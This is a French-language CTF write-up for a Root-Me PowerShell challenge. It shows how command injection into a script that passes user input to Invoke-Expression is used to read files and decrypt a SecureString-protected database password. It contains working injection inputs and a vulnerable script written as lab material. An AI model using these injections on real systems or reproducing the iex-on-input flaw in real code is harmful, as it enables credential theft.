# Powershell - SecureString

## 15 Points
### Secure My String

## Énoncé
Retrouvez le mot de passe de la base de données.

### Paramètres de connexion au challenge
| Hôte |	challenge05.root-me.org |
| --- | --- |
| Protocole |	SSH
| Port |	2225
| Accès SSH	| ssh -p 2225 app-script-ch19@challenge05.root-me.org
| Nom d'utilisateur |	app-script-ch19
| Mot de passe |	app-script-ch19

## Solution

Ce challenge nous plong directement dans un powershell ou on nous fait un semblant de base de données. Pour bien commencer ce challenge, on va d'abord regarder si on peut faire une injection de commande comme on l'a appris dans le challenge PowerShell précédent:
```Pwsh
Table to dump:
> Invoke-Expression(dir)
Connect to the database With the secure Password: System.Security.SecureString. Backup the table Invoke-Expression .git .passwd.crypt ._perms AES.key ch19.ps1
```

on trouve donc plusieurs fichiers intéressant: **.passwd.crypt AES.KEY ch19.ps1**

On va tout d'abord regarder le fichier du challenge dans l'optique de comprendre comment il marche:
```pwsh
Table to dump:
> Invoke-Expression(cat ch19.ps1)
Connect to the database With the secure Password: System.Security.SecureString. Backup the table Invoke-Expression  $KeyFile = "AES.key" $key = Get-Content $KeyFile $SecurePassword =
Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key  while($true){     Write-Host "Table to dump:"     Write-Host -NoNewLine "> "      $table=Read-Host        iex "Write-Host
 Connect to the database With the secure Password: $SecurePassword. Backup the table $table" }
```

ou de manière plus belle:
```pwsh
$KeyFile = "AES.key"
$key = Get-Content $KeyFile
$SecurePassword = Get-Content .passwd.crypt | ConvertTo-SecureString -key $Key
while($true){
    Write-Host "Table to dump:"
    Write-Host -NoNewLine "> "
    $table=Read-Host
    iex "Write-Host Connect to the database With the secure Password: $SecurePassword. Backup the table $table"
}
```

Notre objectif va donc être d'essayer de faire une injection de commande ou on va manipuler $SecurePassword pour récupérer la valeur de base.

Pour cela j'ai recherché sur internet, et j'ai trouvé cela:

```pwsh
#PART1
# create aes key - keep this secure at all times
$aesKey = (2,3,1,4,54,32,144,23,5,3,1,41,36,31,18,175,6,17,1,9,5,1,76,23)
 
# set string
$plaintext = "test12345$"
 
clear-host
 
Write-Host "Plaintext: $plaintext`n"
 
# convert to secure string object
$Secure = ConvertTo-SecureString -String $plaintext -AsPlainText -Force
 
# store secure object - use output in the decryption process. Could be saved to file.
# remember, the aeskey should remain physically secured
$encrypted = ConvertFrom-SecureString -SecureString $Secure -Key $aesKey
Write-Host "Encrypted:`n$encrypted`n"
 
#PART2
$aesKey = (2,3,1,4,54,32,144,23,5,3,1,41,36,31,18,175,6,17,1,9,5,1,76,23)
# create new object using $encrypted and $aeskey
$secureObject = ConvertTo-SecureString -String $encrypted -Key $aesKey
 
# perform decryption from secure object
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```

Ce qui correspond exactement à notre cas de figure, on va donc pour faire les ligne pour décrypter notre $SecurePassword:
```pwsh
Table to dump:
> Invoke-Expression($decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword))
Connect to the database With the secure Password: System.Security.SecureString. Backup the table Invoke-Expression 2477969890808
Table to dump:
> Invoke-Expression($decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(2477969890808))
Connect to the database With the secure Password: System.Security.SecureString. Backup the table Invoke-Expression [censorship]
```

Cela à marcher parfaitement, on a récupérer le contenue de la SecureString !